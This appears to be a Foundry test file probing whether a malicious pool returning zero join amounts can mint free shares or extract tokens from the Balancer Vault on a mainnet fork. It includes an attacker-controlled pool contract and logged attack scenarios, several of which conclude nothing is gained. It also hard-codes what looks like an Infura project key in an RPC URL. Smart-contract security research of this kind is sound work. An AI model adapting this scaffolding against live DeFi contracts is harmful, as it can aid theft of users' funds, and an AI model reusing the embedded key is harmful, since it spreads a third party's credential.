// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// ============================================================================
// ZERO AMOUNTS EXPLOIT INVESTIGATION
//
// Finding: Pool can return zero amounts from onJoinPool and join "succeeds"
// without transferring any tokens.
//
// Question: Can this be exploited to:
// 1. Mint pool shares for free?
// 2. Manipulate pool state?
// 3. Create accounting inconsistencies?
// ============================================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface IAsset {}

interface IVault {
    enum PoolSpecialization { GENERAL, MINIMAL_SWAP_INFO, TWO_TOKEN }

    struct JoinPoolRequest {
        IAsset[] assets;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }

    struct ExitPoolRequest {
        IAsset[] assets;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    function registerPool(PoolSpecialization specialization) external returns (bytes32);
    function registerTokens(bytes32 poolId, IERC20[] memory tokens, address[] memory assetManagers) external;
    function getPoolTokens(bytes32 poolId) external view returns (IERC20[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);
    function joinPool(bytes32 poolId, address sender, address recipient, JoinPoolRequest memory request) external payable;
    function exitPool(bytes32 poolId, address sender, address payable recipient, ExitPoolRequest memory request) external;
    function getPool(bytes32 poolId) external view returns (address, PoolSpecialization);
}

interface IGeneralPool {
    function getPoolId() external view returns (bytes32);

    function onJoinPool(
        bytes32 poolId,
        address sender,
        address recipient,
        uint256[] memory balances,
        uint256 lastChangeBlock,
        uint256 protocolSwapFeePercentage,
        bytes memory userData
    ) external returns (uint256[] memory amountsIn, uint256[] memory dueProtocolFeeAmounts);

    function onExitPool(
        bytes32 poolId,
        address sender,
        address recipient,
        uint256[] memory balances,
        uint256 lastChangeBlock,
        uint256 protocolSwapFeePercentage,
        bytes memory userData
    ) external returns (uint256[] memory amountsOut, uint256[] memory dueProtocolFeeAmounts);
}

// ============================================================================
// EXPLOIT POOL: Returns zero amounts but tries to mint shares
// ============================================================================

contract ZeroAmountExploitPool is IGeneralPool, IERC20 {
    IVault public immutable vault;
    bytes32 public poolId;
    IERC20[] public tokens;

    // Pool token state (this pool IS the BPT)
    string public name = "Exploit Pool Token";
    string public symbol = "EXPLOIT";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    // Attack modes
    bool public returnZeroAmounts;
    bool public mintSharesAnyway;
    uint256 public sharesToMint;

    // Tracking
    uint256 public joinCallCount;
    uint256 public exitCallCount;

    constructor(IVault _vault) {
        vault = _vault;
    }

    function initialize(IVault.PoolSpecialization spec) external returns (bytes32) {
        poolId = vault.registerPool(spec);
        return poolId;
    }

    function getPoolId() external view override returns (bytes32) {
        return poolId;
    }

    function setupTokens(IERC20[] memory _tokens) external {
        tokens = _tokens;
        address[] memory assetManagers = new address[](_tokens.length);
        vault.registerTokens(poolId, _tokens, assetManagers);
    }

    function setAttackMode(bool _returnZero, bool _mintAnyway, uint256 _shares) external {
        returnZeroAmounts = _returnZero;
        mintSharesAnyway = _mintAnyway;
        sharesToMint = _shares;
    }

    // ========================================================================
    // Pool hooks - where the exploit happens
    // ========================================================================

    function onJoinPool(
        bytes32,
        address sender,
        address recipient,
        uint256[] memory balances,
        uint256,
        uint256,
        bytes memory userData
    ) external override returns (uint256[] memory amountsIn, uint256[] memory dueProtocolFeeAmounts) {
        require(msg.sender == address(vault), "Only vault");
        joinCallCount++;

        amountsIn = new uint256[](balances.length);
        dueProtocolFeeAmounts = new uint256[](balances.length);

        if (returnZeroAmounts) {
            // Return all zeros - no tokens should transfer
            // But we might try to mint shares anyway
            if (mintSharesAnyway && sharesToMint > 0) {
                _mint(recipient, sharesToMint);
            }
            return (amountsIn, dueProtocolFeeAmounts);
        }

        // Normal join - decode amounts from userData
        if (userData.length > 0) {
            uint256[] memory requested = abi.decode(userData, (uint256[]));
            for (uint i = 0; i < requested.length && i < amountsIn.length; i++) {
                amountsIn[i] = requested[i];
            }
        }

        // Mint proportional shares
        uint256 shareMint = 0;
        for (uint i = 0; i < amountsIn.length; i++) {
            shareMint += amountsIn[i];
        }
        if (shareMint > 0) {
            _mint(recipient, shareMint);
        }

        return (amountsIn, dueProtocolFeeAmounts);
    }

    function onExitPool(
        bytes32,
        address sender,
        address recipient,
        uint256[] memory balances,
        uint256,
        uint256,
        bytes memory userData
    ) external override returns (uint256[] memory amountsOut, uint256[] memory dueProtocolFeeAmounts) {
        require(msg.sender == address(vault), "Only vault");
        exitCallCount++;

        amountsOut = new uint256[](balances.length);
        dueProtocolFeeAmounts = new uint256[](balances.length);

        // Return 10% of each balance
        for (uint i = 0; i < balances.length; i++) {
            if (balances[i] > 0) {
                amountsOut[i] = balances[i] / 10;
            }
        }

        // Burn some shares from sender
        uint256 shareBurn = balanceOf[sender] / 10;
        if (shareBurn > 0) {
            _burn(sender, shareBurn);
        }

        return (amountsOut, dueProtocolFeeAmounts);
    }

    // ========================================================================
    // ERC20 Implementation (this pool is its own BPT)
    // ========================================================================

    function transfer(address to, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount;
        totalSupply -= amount;
        emit Transfer(from, address(0), amount);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    receive() external payable {}
}

// ============================================================================
// TEST CONTRACT
// ============================================================================

contract ZeroAmountsExploitTest is Test {
    IVault constant VAULT = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant BAL = IERC20(0xba100000625a3754423978a60c9317c58a424e3D);

    ZeroAmountExploitPool public exploitPool;
    bytes32 public poolId;
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        attacker = address(this);
        vm.deal(attacker, 1000 ether);
        WETH.deposit{value: 500 ether}();
        deal(address(BAL), attacker, 100000 ether);

        WETH.approve(address(VAULT), type(uint256).max);
        BAL.approve(address(VAULT), type(uint256).max);
    }

    function _setupPool() internal returns (bytes32) {
        exploitPool = new ZeroAmountExploitPool(VAULT);
        poolId = exploitPool.initialize(IVault.PoolSpecialization.GENERAL);

        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(WETH));
        tokens[1] = BAL;

        exploitPool.setupTokens(tokens);
        return poolId;
    }

    function _seedPool() internal {
        // Disable attack for seeding
        exploitPool.setAttackMode(false, false, 0);

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 10 ether;
        amounts[1] = 1000 ether;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        VAULT.joinPool(poolId, attacker, attacker, request);
    }

    // ========================================================================
    // TEST: Zero amounts join - what actually happens?
    // ========================================================================

    function test_ZeroAmountsJoin_DetailedAnalysis() public {
        console.log("=== ZERO AMOUNTS JOIN - DETAILED ANALYSIS ===");
        _setupPool();
        _seedPool();

        console.log("\n--- Pre-Attack State ---");
        (IERC20[] memory tokensBefore, uint256[] memory balsBefore,) = VAULT.getPoolTokens(poolId);
        console.log("Pool WETH:", balsBefore[0]);
        console.log("Pool BAL:", balsBefore[1]);
        console.log("Attacker shares:", exploitPool.balanceOf(attacker));
        console.log("Total supply:", exploitPool.totalSupply());
        console.log("Attacker WETH:", WETH.balanceOf(attacker));
        console.log("Attacker BAL:", BAL.balanceOf(attacker));

        // Enable zero amounts mode (no minting)
        exploitPool.setAttackMode(true, false, 0);

        console.log("\n--- Executing Zero Amounts Join ---");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1 ether; // We SAY we'll deposit this
        amounts[1] = 100 ether;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        uint256 wethBefore = WETH.balanceOf(attacker);
        uint256 balBefore = BAL.balanceOf(attacker);

        VAULT.joinPool(poolId, attacker, attacker, request);

        console.log("\n--- Post-Attack State ---");
        (IERC20[] memory tokensAfter, uint256[] memory balsAfter,) = VAULT.getPoolTokens(poolId);
        console.log("Pool WETH:", balsAfter[0]);
        console.log("Pool BAL:", balsAfter[1]);
        console.log("Attacker shares:", exploitPool.balanceOf(attacker));
        console.log("Total supply:", exploitPool.totalSupply());
        console.log("Attacker WETH:", WETH.balanceOf(attacker));
        console.log("Attacker BAL:", BAL.balanceOf(attacker));

        // Analysis
        console.log("\n--- ANALYSIS ---");
        console.log("Pool WETH change:", balsAfter[0] - balsBefore[0]);
        console.log("Pool BAL change:", balsAfter[1] - balsBefore[1]);
        console.log("Attacker WETH change:", wethBefore - WETH.balanceOf(attacker));
        console.log("Attacker BAL change:", balBefore - BAL.balanceOf(attacker));

        if (balsAfter[0] == balsBefore[0] && balsAfter[1] == balsBefore[1]) {
            console.log("\nPool balances UNCHANGED - no exploit here");
            console.log("(Zero amounts = zero transferred = nothing gained)");
        } else {
            console.log("\n!!! Pool balances CHANGED without transfer !!!");
        }
    }

    // ========================================================================
    // TEST: Zero amounts BUT mint shares anyway
    // ========================================================================

    function test_ZeroAmounts_MintSharesAnyway() public {
        console.log("=== ZERO AMOUNTS + MINT SHARES ANYWAY ===");
        console.log("Can pool mint shares without receiving tokens?");
        _setupPool();
        _seedPool();

        console.log("\n--- Pre-Attack State ---");
        console.log("Attacker shares:", exploitPool.balanceOf(attacker));
        console.log("Total supply:", exploitPool.totalSupply());

        // Enable: return zero amounts BUT mint shares
        exploitPool.setAttackMode(true, true, 1000 ether);

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0;
        amounts[1] = 0;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: "",
            fromInternalBalance: false
        });

        uint256 sharesBefore = exploitPool.balanceOf(attacker);

        VAULT.joinPool(poolId, attacker, attacker, request);

        uint256 sharesAfter = exploitPool.balanceOf(attacker);

        console.log("\n--- Post-Attack State ---");
        console.log("Attacker shares:", sharesAfter);
        console.log("Shares gained:", sharesAfter - sharesBefore);
        console.log("Total supply:", exploitPool.totalSupply());

        if (sharesAfter > sharesBefore) {
            console.log("\n!!! SHARES MINTED WITHOUT DEPOSITING TOKENS !!!");
            console.log("However, these are POOL-INTERNAL shares");
            console.log("Pool controls share minting - this is by design");
            console.log("The Vault's job is token custody, not share accounting");
        }

        // Now try to exit and steal tokens
        console.log("\n--- Attempting to Exit with Free Shares ---");

        (,uint256[] memory poolBals,) = VAULT.getPoolTokens(poolId);
        console.log("Pool WETH:", poolBals[0]);
        console.log("Pool BAL:", poolBals[1]);

        IVault.ExitPoolRequest memory exitRequest = IVault.ExitPoolRequest({
            assets: assets,
            minAmountsOut: new uint256[](2),
            userData: "",
            toInternalBalance: false
        });

        uint256 wethBefore = WETH.balanceOf(attacker);
        uint256 balBefore = BAL.balanceOf(attacker);

        try VAULT.exitPool(poolId, attacker, payable(attacker), exitRequest) {
            console.log("\nExit succeeded!");
            console.log("WETH received:", WETH.balanceOf(attacker) - wethBefore);
            console.log("BAL received:", BAL.balanceOf(attacker) - balBefore);

            (,uint256[] memory poolBalsAfter,) = VAULT.getPoolTokens(poolId);
            console.log("\nPool WETH after exit:", poolBalsAfter[0]);
            console.log("Pool BAL after exit:", poolBalsAfter[1]);

            if (WETH.balanceOf(attacker) > wethBefore || BAL.balanceOf(attacker) > balBefore) {
                console.log("\n!!! TOKENS EXTRACTED WITH FREE SHARES !!!");
            }
        } catch Error(string memory reason) {
            console.log("Exit failed:", reason);
        } catch {
            console.log("Exit failed");
        }
    }

    // ========================================================================
    // TEST: Repeated zero-amount joins
    // ========================================================================

    function test_RepeatedZeroJoins() public {
        console.log("=== REPEATED ZERO-AMOUNT JOINS ===");
        console.log("Can we accumulate something over many zero joins?");
        _setupPool();
        _seedPool();

        exploitPool.setAttackMode(true, false, 0);

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1 ether;
        amounts[1] = 100 ether;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        console.log("Executing 100 zero-amount joins...");

        (,uint256[] memory balsBefore,) = VAULT.getPoolTokens(poolId);
        uint256 wethBefore = WETH.balanceOf(attacker);

        for (uint i = 0; i < 100; i++) {
            VAULT.joinPool(poolId, attacker, attacker, request);
        }

        (,uint256[] memory balsAfter,) = VAULT.getPoolTokens(poolId);

        console.log("\nAfter 100 zero joins:");
        console.log("Pool WETH change:", balsAfter[0] - balsBefore[0]);
        console.log("Pool BAL change:", balsAfter[1] - balsBefore[1]);
        console.log("Attacker WETH spent:", wethBefore - WETH.balanceOf(attacker));
        console.log("Join call count:", exploitPool.joinCallCount());

        if (balsAfter[0] == balsBefore[0] && balsAfter[1] == balsBefore[1]) {
            console.log("\nNo accumulation - zero = zero");
        }
    }

    // ========================================================================
    // TEST: Check lastChangeBlock behavior with zero joins
    // ========================================================================

    function test_LastChangeBlock_ZeroJoins() public {
        console.log("=== lastChangeBlock BEHAVIOR WITH ZERO JOINS ===");
        _setupPool();
        _seedPool();

        (,, uint256 lastBlockBefore) = VAULT.getPoolTokens(poolId);
        console.log("lastChangeBlock before:", lastBlockBefore);

        exploitPool.setAttackMode(true, false, 0);

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: "",
            fromInternalBalance: false
        });

        // Move forward some blocks
        vm.roll(block.number + 100);

        VAULT.joinPool(poolId, attacker, attacker, request);

        (,, uint256 lastBlockAfter) = VAULT.getPoolTokens(poolId);
        console.log("lastChangeBlock after:", lastBlockAfter);
        console.log("Current block:", block.number);

        if (lastBlockAfter != lastBlockBefore) {
            console.log("\nlastChangeBlock UPDATED despite zero transfer!");
            console.log("This could affect oracle assumptions");
        } else {
            console.log("\nlastChangeBlock unchanged - expected behavior");
        }
    }

    receive() external payable {}
}
